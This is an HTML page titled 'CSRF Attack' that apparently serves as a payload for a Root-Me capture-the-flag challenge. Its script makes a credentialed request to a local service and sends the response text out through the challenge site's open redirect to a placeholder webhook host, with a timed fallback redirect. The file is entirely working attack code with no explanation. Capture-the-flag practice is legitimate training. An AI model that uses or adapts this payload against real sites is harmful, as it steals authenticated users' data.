<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <script>
        // Try XHR with specific settings
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://127.0.0.1:58039/home', true);
        xhr.withCredentials = true;
        xhr.onload = function() {
            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://your-webhook-url?home=' + encodeURIComponent(xhr.responseText);
        };
        xhr.send();
        
        // Fallback
        setTimeout(function() {
            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://your-webhook-url?timeout=true';
        }, 1500);
    </script>
</body>
</html>
